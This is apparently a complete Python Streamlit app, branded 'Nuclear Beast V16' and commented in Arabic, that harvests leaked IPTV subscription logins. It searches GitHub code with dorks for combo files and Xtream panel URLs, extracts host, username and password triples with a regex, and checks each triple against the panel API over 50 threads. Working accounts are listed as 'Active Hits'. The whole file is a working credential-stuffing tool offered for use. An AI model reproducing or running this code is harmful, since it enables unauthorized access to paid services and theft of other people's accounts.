import streamlit as st
import requests
import re
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# =================================================
# 1. إعدادات الدخول
# =================================================
LOGIN_PASSWORD = "BEAST_V16_NUCLEAR" 

def check_password():
    if "password_correct" not in st.session_state:
        st.session_state.password_correct = False
    if st.session_state.password_correct:
        return True

    st.markdown("<h1 style='text-align: center; color: #ff0033;'>☢️ NUCLEAR BEAST V16 ☢️</h1>", unsafe_allow_html=True)
    pwd = st.text_input("أدخل كود التفعيل:", type="password")
    if st.button("تفعيل المفاعل"):
        if pwd == LOGIN_PASSWORD:
            st.session_state.password_correct = True
            st.rerun()
        else:
            st.error("❌ الكود خاطئ!")
    return False

if not check_password():
    st.stop()

# =================================================
# 2. تصميم الواجهة (Nuclear Theme)
# =================================================
st.set_page_config(page_title="Nuclear Beast V16", layout="wide", page_icon="☢️")

st.markdown("""
<style>
    .stApp { background-color: #000000; }
    div.stButton > button {
        background-color: #ff0033; color: white; font-weight: bold; border: 1px solid #ff0033;
        transition: 0.3s;
    }
    div.stButton > button:hover {
        background-color: #cc0000; box-shadow: 0 0 15px #ff0033;
    }
    .card {
        background: #0f0f0f;
        border: 1px solid #333;
        border-left: 5px solid #ff0033;
        padding: 15px;
        margin-bottom: 10px;
        font-family: 'Courier New', monospace;
    }
    .active-badge {
        background: #ff0033; color: white; padding: 2px 8px; font-weight: bold; border-radius: 3px; font-size: 0.8em;
    }
    .stat-box {
        background: #111; border: 1px solid #444; padding: 10px; text-align: center; border-radius: 5px;
    }
    .stat-num { font-size: 24px; font-weight: bold; color: #ff0033; }
</style>
""", unsafe_allow_html=True)

# =================================================
# 3. إدارة البيانات والذاكرة
# =================================================
if 'results' not in st.session_state: st.session_state.results = []
if 'is_running' not in st.session_state: st.session_state.is_running = False
if 'total_checked' not in st.session_state: st.session_state.total_checked = 0
if 'seen_combos' not in st.session_state: st.session_state.seen_combos = set()

# =================================================
# 4. قائمة الدروكات العملاقة (Combos & Lists)
# =================================================
NUCLEAR_DORKS = [
    # دروكات القوائم والكومبو (للكميات الكبيرة)
    'filename:iptv_list.txt "username="',
    'filename:combo.txt "http" "username="',
    'extension:txt "EXTINF" "username="',
    'filename:servers.cfg "server_address"',
    'path:enigma2 "iptv.sh"',
    'extension:m3u "type=m3u" "username="',
    'extension:json "iptv_credentials"',
    # دروكات الألواح الشهيرة
    '"/get.php?username=" extension:txt',
    '"/player_api.php?username=" extension:txt',
    '"/xmltv.php?username=" extension:txt',
    'inurl:"player_api.php" "username" "password"',
    'inurl:"get.php" "username" "password"',
    'site:pastebin.com "get.php?username="'
]

# =================================================
# 5. المحرك النووي (Core Engine)
# =================================================

def verify_xtream(data):
    """ فحص السيرفر والتحقق من صلاحيته """
    host, user, pw = data
    
    # منع التكرار
    combo_id = f"{host}|{user}"
    if combo_id in st.session_state.seen_combos: return None
    st.session_state.seen_combos.add(combo_id)

    try:
        # تصحيح الرابط
        if not host.startswith("http"): host = "http://" + host
        host = host.rstrip('/')
        
        # رابط الفحص المباشر
        check_url = f"{host}/player_api.php?username={user}&password={pw}"
        
        # Timeout قصير للسرعة
        r = requests.get(check_url, timeout=3).json()
        
        user_info = r.get("user_info", {})
        if user_info.get("status") == "Active":
            # استخراج تاريخ الانتهاء
            exp_ts = user_info.get('exp_date')
            if exp_ts:
                try:
                    exp_date = datetime.fromtimestamp(int(exp_ts)).strftime('%Y-%m-%d')
                except: exp_date = "Unlimited"
            else: exp_date = "Unlimited"
            
            return {
                "host": host,
                "user": user,
                "pass": pw,
                "exp": exp_date,
                "max": user_info.get("max_connections", "N/A"),
                "active": user_info.get("active_cons", "0")
            }
    except:
        pass
    return None

def fetch_file_content(url):
    """ دالة مساعدة لجلب محتوى الملفات الخام """
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            return r.text
    except: pass
    return ""

# =================================================
# 6. الشريط الجانبي (المفاعل)
# =================================================
with st.sidebar:
    st.title("☢️ CONTROL ROOM")
    token = st.text_input("GITHUB TOKEN:", type="password")
    
    col1, col2 = st.columns(2)
    with col1:
        start_btn = st.button("🚀 إطلاق الصواريخ", use_container_width=True)
    with col2:
        stop_btn = st.button("🛑 إيقاف الطوارئ", use_container_width=True)

    if start_btn and token:
        st.session_state.is_running = True
    if stop_btn:
        st.session_state.is_running = False
        
    st.markdown("---")
    st.markdown("<div class='stat-box'><div class='stat-num'>" + str(st.session_state.total_checked) + "</div><div>Targets Scanned</div></div>", unsafe_allow_html=True)
    st.markdown("<div class='stat-box' style='margin-top:10px;'><div class='stat-num'>" + str(len(st.session_state.results)) + "</div><div>Active Hits 💎</div></div>", unsafe_allow_html=True)

# =================================================
# 7. ساحة المعركة (Main Logic)
# =================================================
results_placeholder = st.container()

def update_ui():
    """ تحديث واجهة النتائج """
    with results_placeholder:
        if not st.session_state.results:
            st.info("System Ready... Waiting for nuclear launch.")
        
        for res in st.session_state.results[:100]: # عرض آخر 100 نتيجة فقط لتخفيف الحمل
            st.markdown(f"""
            <div class="card">
                <div style="display:flex; justify-content:space-between;">
                    <span style="color:#ff0033; font-weight:bold;">{res['host']}</span>
                    <span class="active-badge">ACTIVE</span>
                </div>
                <div style="margin-top:10px; color:#ccc; font-size:0.9em;">
                    USER: <b style="color:white">{res['user']}</b> &nbsp;|&nbsp; PASS: <b style="color:white">{res['pass']}</b>
                </div>
                <div style="margin-top:5px; font-size:0.8em; color:#666;">
                    EXP: <span style="color:#ffcc00">{res['exp']}</span> &nbsp;|&nbsp; CONNS: {res['active']}/{res['max']}
                </div>
            </div>
            """, unsafe_allow_html=True)

# المنطق الرئيسي للبحث
if st.session_state.is_running:
    headers = {'Authorization': f'token {token}'}
    status_msg = st.empty()
    
    # خلط الدروكات
    random.shuffle(NUCLEAR_DORKS)
    
    for dork in NUCLEAR_DORKS:
        if not st.session_state.is_running: break
        
        # ⚡⚡ التغيير الجذري: البحث حتى الصفحة 10 ⚡⚡
        for page in range(1, 11): 
            if not st.session_state.is_running: break
            
            status_msg.warning(f"📡 SCANNING: {dork} [PAGE {page}/10]")
            
            try:
                # طلب البحث من GitHub
                api = f"https://api.github.com/search/code?q={dork}&per_page=50&page={page}"
                res = requests.get(api, headers=headers)
                
                if res.status_code == 403:
                    status_msg.error("⚠️ Rate Limit Hit! Cooling down for 15s...")
                    time.sleep(15)
                    continue
                
                data = res.json()
                raw_urls = []
                
                if 'items' in data:
                    for item in data['items']:
                        raw_urls.append(item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/'))
                
                # مرحلة استخراج البيانات (Extraction Phase)
                candidates = []
                status_msg.info(f"📥 Downloading {len(raw_urls)} files for analysis...")
                
                # استخدام ThreadPool لجلب محتوى الملفات بسرعة
                with ThreadPoolExecutor(max_workers=10) as fetcher:
                    contents = list(fetcher.map(fetch_file_content, raw_urls))
                
                for content in contents:
                    # Regex شامل لجميع الصيغ المحتملة
                    # يلتقط: http://site.com:8080/get.php?username=X&password=Y
                    # وأيضاً الصيغ داخل ملفات M3U
                    matches = re.findall(r'(https?://[a-zA-Z0-9\.-]+(?::\d+)?).*?[?&]username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)', content)
                    for m in matches:
                        candidates.append(m)
                
                # مرحلة الفحص النووي (Nuclear Verification Phase)
                if candidates:
                    unique_candidates = list(set(candidates)) # إزالة التكرار الداخلي
                    total_cand = len(unique_candidates)
                    st.session_state.total_checked += total_cand
                    
                    status_msg.markdown(f"☢️ Processing **{total_cand}** potential targets with 50 threads...")
                    
                    # ⚡⚡ 50 خيط معالجة للفحص المتوازي ⚡⚡
                    with ThreadPoolExecutor(max_workers=50) as executor:
                        futures = [executor.submit(verify_xtream, c) for c in unique_candidates]
                        
                        for future in as_completed(futures):
                            result = future.result()
                            if result:
                                st.session_state.results.insert(0, result)
                                st.toast(f"HIT: {result['host']}", icon="☢️")
                    
                    update_ui()
            
            except Exception as e:
                pass
            
            # استراحة قصيرة جداً لتجنب الحظر الكامل
            time.sleep(1)

    st.session_state.is_running = False
    status_msg.success("✅ MISSION COMPLETE. ALL TARGETS SCANNED.")
    update_ui()

else:
    update_ui()
